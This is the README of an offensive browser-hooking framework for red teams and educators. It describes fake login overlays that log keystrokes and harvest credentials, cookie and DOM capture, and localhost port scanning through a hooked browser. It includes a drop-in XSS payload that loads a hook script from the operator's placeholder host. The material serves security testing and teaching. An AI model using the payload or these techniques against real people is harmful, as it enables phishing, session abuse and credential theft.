# WRAITH — browser hook framework

**A modern, standalone browser-hooking framework for red teams, security
researchers, and educators — a clean-room successor to BeEF and the blind-XSS
callback tools we live in.**

> **FOR AUTHORIZED SECURITY TESTING, RESEARCH & EDUCATION ONLY.** WRAITH is an
> offensive-security tool for demonstrating and testing phishing /
> man-in-the-browser / blind-XSS tradecraft. Only use it against systems and
> people you have **explicit authorization** to test. You are responsible for how
> you use it.

---

## Why we built it

Over the course of our work at **Arcanum**, we kept reaching for two different
kinds of tooling and wishing they were one thing.

On one side was **BeEF** — the Browser Exploitation Framework — for the classic
*hook a browser, then work from inside its session* workflow: keylog a fake login,
recon the local network, push a module at a live victim. It's the tool we used in
class to make man-in-the-browser real to people. But it's showing its age, big
chunks of it are unreliable in today's browsers, and the social-engineering
overlays look like logins from a decade ago.

On the other side were our favorite **blind-XSS callback frameworks** (XSS Hunter,
ezXSS): drop a payload into a field, and the instant it fires somewhere you can't
see, it calls home with the loot — origin, cookies, DOM, a screenshot.

What we increasingly needed — especially as more of our targets became **AI
application ecosystems**, where untrusted text flows through agents, tool
outputs, admin review queues, and support consoles, and *fires JavaScript in
places nobody is watching* — was a single framework that did **both**: the
interactive, persistent post-exploitation control of a BeEF hook, **and** the
fire-and-forget blind-XSS callback loot, in one payload that's reliable in current
browsers and looks like today's real login screens.

So we built **WRAITH**.

## Heads up: this is a work in progress

We're releasing WRAITH **early, and on purpose.** We'd rather get it into the
hands of the people who'll actually teach and test with it — and hear what breaks —
than sit on it until it's "done."

That means: **expect rough edges and bugs.** Some modules are more battle-tested
than others, browser behavior shifts under us constantly (see the network-scan
notes below), and APIs may change between versions. If you hit something, please
open an issue — repro steps, browser + version, and what you expected are gold.
PRs welcome under the project's [contribution terms](#license--attribution).

---

## Quick start (Docker)

The fastest path. You need Docker + Docker Compose.

```bash
git clone https://github.com/arcanum-sec/wraith
cd wraith
./setup.sh
```

`setup.sh` walks you through everything:

1. **Detects your public IP** (or lets you enter a domain / custom host) so every
   hook and payload URL is minted with *your* address.
2. Has you **set an operator username + password** for the console login.
3. Generates the session-signing secret, writes a gitignored `.env` (chmod 600),
   and **builds + starts the container**.
4. Prints your live URLs and a **drop-in XSS payload** at the end:

```
  Operator console : http://YOUR_IP:8090/operator/
  Login page       : http://YOUR_IP:8090/login   (user "operator")
  Demo victim page : http://YOUR_IP:8090/demo/
  Hook payload     : http://YOUR_IP:8090/hook.js

  Drop-in XSS payload:
    "><script src="http://YOUR_IP:8090/hook.js"></script>
```

Manage it with standard compose commands:

```bash
docker compose logs -f      # watch it
docker compose down         # stop (keeps ./data)
./setup.sh                  # reconfigure (rotate password, change address, …)
```

Captured sessions persist in `./data/` on the host — **never** baked into the
image, **never** committed (`.env` and `data/` are gitignored).

### Run it locally without Docker (dev)

```bash
npm install
npm start
```

Then open the operator console at http://127.0.0.1:3000/operator/ and the demo
victim page at http://127.0.0.1:3000/demo/ (in a second browser/profile). On
localhost, login is disabled by default for convenience — the server **refuses**
to bind to a public interface without an operator password, so you can't
accidentally expose an open panel.

---

## What it does

1. **Hook** — `/hook.js` is a small payload. Drop it in any lab page
   (`<script src="/hook.js"></script>`) or deliver it via an XSS in your lab target.
   The browser that loads it opens a WebSocket back to the operator and appears in
   the console with a fingerprint (browser, OS, IP, page, UA). It auto-reconnects
   and survives navigation.
2. **Operator console** — `/operator/` shows every hooked browser online/offline,
   lets you pick one and **deploy** an overlay at it, and streams the victim's
   **keystrokes live** plus the final **captured credentials**. It also ships an
   **XSS payload catalog** (XSS-Hunter-style) auto-filled with your hook URL.
3. **Overlay modules** — modernized fake-login overlays, rendered in an isolated
   shadow DOM so they look pixel-correct on any host page, and they frost-blur the
   page behind them like a real re-auth modal:
   - **LinkedIn** — "session expired" re-auth
   - **Facebook** — "you've been logged out" re-login
   - **Microsoft / Office 365** — authentic two-step (email → password)
4. **Local Network Scan** (task module) — uses the hooked browser as a proxy to
   reach the victim's **local** services / LAN. Calibrated loopback service scan
   plus (browser-permitting) LAN modes, and a WebRTC local-IP leak. Results stream
   live into the console.
5. **Page Capture** (task module) — the **blind-XSS** loot: grabs the **origin +
   URL + referrer** (where the payload fired), the victim's **cookies**
   (non-HttpOnly), the full **DOM**, and a **screenshot** (html2canvas). The hook
   reports origin and a JS-readable-cookie count automatically on first contact,
   mirroring the instant a real blind-XSS payload calls home.
6. **Page Mirror** — browse the victim's origin from inside their session:
   fetch same-origin URLs *through* the hooked browser (carrying their cookies),
   or grab the live DOM.

Adding a module is one file in `modules/` — see `modules/linkedin.js` (overlay)
or `modules/portscan.js` / `modules/capture.js` (background tasks).

### A built-in practice lab

Mounted at `/lab` is a deliberately vulnerable "support desk" with a stored-XSS
sink, so you can demo the whole chain end to end, same-origin: submit a malicious
ticket → an "agent" reviews the queue and the payload fires (the blind-XSS moment)
→ Page Mirror the hooked agent and pull a credential vault that only resolves
*inside* their authenticated session. It's intentionally insecure by design and
carries planted flags.

### Teaching blind XSS on this platform

The hook fires the moment it loads, exactly like a blind-XSS payload dropped into
a stored field that later renders in some admin/support/log/agent context you
can't see. **Page Capture** is the callback loot those frameworks collect. Lessons
surfaced in the data:

- **Cookies are JS-readable only.** HttpOnly cookies never appear, which is the
  whole point of HttpOnly. The viewer says so when the list is empty.
- **Screenshots are best-effort.** html2canvas can be blocked by **CSP**, and
  **cross-origin images taint the canvas** so it can't be exported. Those failures
  are reported honestly instead of hidden — they are the lesson.
- **Origin + referrer tell you where you landed**, which for blind XSS is the
  entire question ("where did my payload execute?").

For an offline lab, self-host html2canvas — see `public/vendor/README.md`.

### About the network scan (read before you demo it)

It is a **timing side-channel**, not a real socket scanner. JavaScript cannot read
cross-origin responses, but it can start a request and watch how it fails and how
fast, which leaks port state. The module was rebuilt around what works in **current
browsers (2025–2026)**, because the old BeEF-era LAN sweep is now dead.

**The modern reality:** Chrome 142+ (Oct 2025) shipped **Local Network Access
(LNA)**, which gates requests to private ranges (10.x / 172.16.x / **192.168.x**)
behind a permission prompt. A blind LAN sweep no longer reaches the wire. But
**loopback (127.0.0.1) is still reachable**, and scanning it is the real-world
attack — eBay, Best Buy, and others were caught port-scanning visitors' localhost
to fingerprint local services and remote-access tools.

So the module has three modes:

- **This machine (localhost)** — the **reliable default**. A *calibrated*
  `127.0.0.1` scan that probes each port with **two independent primitives**:
  fetch-timing **and** WebSocket-timing (the literal eBay `check.js` method). It
  first probes known-closed ports to learn this machine's RST baseline on each
  channel, then flags anything that resolves, hangs, or runs slower as **OPEN**,
  labels the likely service, and shows per-port whether **fetch**, **ws**, or
  **both** agreed. Works in Chrome **and** Firefox today.
- **LAN host** — scan one private IP. Works only if the browser lets it through;
  Chrome 142+ will usually block it (the module detects this and says so).
- **Discover LAN hosts** — subnet sweep. Mostly LNA-blocked now; kept to *show*
  the block as the lesson.

**Statuses:** OPEN (service answered / socket held), CLOSED (fast RST near the
calibrated baseline), FILTERED (hung — LAN only), BLOCKED (browser-refused port).

## How it maps to BeEF (for the lecture)

| BeEF | WRAITH |
|---|---|
| `hook.js` + XHR polling | `public/hook.js` + WebSocket (live, reliable) |
| Ruby server + RESTful API | `server.js` (Node + `ws`) |
| Online/offline browsers panel | Operator console "Hooked Browsers" |
| Pretty Theft module | overlay `modules/*.js` (modern LinkedIn/Facebook/Microsoft) |
| Network discovery / port scanner | `modules/portscan.js` (calibrated, current-browser) |
| Command results | Live keystrokes + Captured Credentials + Scan Results |
| *(BeEF had no blind-XSS callback)* | **Page Capture** (origin/cookies/DOM/screenshot) |

## "How is this different from blind XSS, Evilginx, or EvilGoPhish?"

Students ask this every time. The short answer: these tools live at **different
stages of the attack** and abuse **different trust contexts**. They're
complementary, and they chain together.

| | WRAITH / BeEF | Blind-XSS frameworks (XSS Hunter, ezXSS) | AiTM proxies (Evilginx, EvilGoPhish, Modlishka) |
|---|---|---|---|
| What it is | Man-in-the-browser **post-exploitation** C2 (+ blind-XSS loot) | XSS **detection + proof** with one-shot recon | **Adversary-in-the-middle** reverse proxy |
| Prerequisite | You already have **JS running in the page** (XSS, malicious/compromised site, injection) | Same: your payload executes somewhere you can't see | Victim **clicks a link and logs in** on your lookalike domain. No XSS needed |
| Origin it abuses | The victim's **real session / real origin** | The vulnerable app's origin | A **separate attacker domain** proxying the real site |
| What the victim sees | A **fake** dialog we draw over any page | Nothing (the payload just fires) | The **real** login page, transparently proxied |
| What you capture | Typed credentials + keystrokes + browser/LAN recon + blind-XSS loot | "It fired, and here": DOM, cookies, screenshot, origin | Real creds **and the post-MFA session token** |
| Beats MFA? | **No** — you phished a static credential | Only if it rides a live authed session in-page | **Yes** — stealing the post-auth session cookie is the point |

The honest distinction to teach: our overlay phish harvests **what the user
types**. It does **not** capture a real session and does **not** beat MFA, because
the user never completed a genuine proxied auth flow. That's exactly why it's a
great contrast — it shows why static-credential phishing is weaker than AiTM, and
sets up why the industry moved to **phishing-resistant, origin-bound auth
(FIDO2 / WebAuthn / passkeys)**. A realistic kill chain uses all three: blind XSS
finds and delivers code execution, a WRAITH hook gives interactive in-session
control, and a redirect can funnel the victim into an Evilginx flow for a real
MFA-passed session.

## Configuration

Everything is env-driven; the same build runs anywhere because `hook.js` derives
its call-back URL from wherever it was served. `setup.sh` writes these into `.env`;
you can also set them by hand.

| Env var | Default | Purpose |
|---|---|---|
| `WRAITH_HOST` | `127.0.0.1` | bind interface (`0.0.0.0` to expose; forced in Docker) |
| `WRAITH_PORT` | `3000` | HTTP + WebSocket port (`setup.sh` defaults to `8090`) |
| `WRAITH_PUBLIC_URL` | *(derived)* | your IP/domain, used to print correct hook URLs |
| `WRAITH_OP_USER` | *(empty)* | operator login username (optional; `setup.sh` sets one) |
| `WRAITH_OP_PASSWORD` | *(empty)* | operator login password; **required** to bind publicly |
| `WRAITH_SECRET` | *(random/boot)* | signs session cookies; set it to keep logins across restarts |
| `WRAITH_SESSION_HOURS` | `12` | operator session lifetime |
| `WRAITH_AUTOCAPTURE` | `1` | auto-fire Page Capture on hook (`0` = manual, BeEF-style) |

The operator console is **login-gated** whenever `WRAITH_OP_PASSWORD` is set (a
signed HttpOnly session cookie covers both the panel and the live WebSocket). The
hook payload, demo page, and `/ws/hook` channel stay public so victims can reach
them. As a fail-safe, the server **refuses to bind to a public interface** unless a
password is set.

For a bare-metal / systemd deployment instead of Docker, see
[deploy/DEPLOY.md](deploy/DEPLOY.md).

## Files

```
server.js            C2 server (HTTP + WS, two roles by path)
config.js            env-driven config
store.js             durable session/loot store (data/sessions.json)
lab.js               deliberately-vulnerable practice lab (/lab)
public/hook.js       the payload
public/demo/         innocuous "victim" landing page
public/operator/     operator console (GUI + payload catalog)
modules/             linkedin.js facebook.js microsoft.js portscan.js capture.js + registry
public/vendor/       optional self-hosted libs (html2canvas for offline screenshots)
setup.sh             interactive Docker installer
Dockerfile           / docker-compose.yml
deploy/              bare-metal systemd alternative
```

## License & attribution

WRAITH is **© 2026 Arcanum Information Security**, released under the
[Apache License 2.0](LICENSE).

You're free to use, modify, and redistribute it — including in your own training —
**but you must keep the attribution**: retain the `LICENSE` and `NOTICE` files and
the Arcanum copyright notice in anything you distribute or fork, and state any
changes you made (Apache-2.0 §4). See [NOTICE](NOTICE). The license does not grant
use of the Arcanum name or marks beyond describing where the code came from.

Built with ❤️ by Arcanum — <https://arcanum-sec.com>
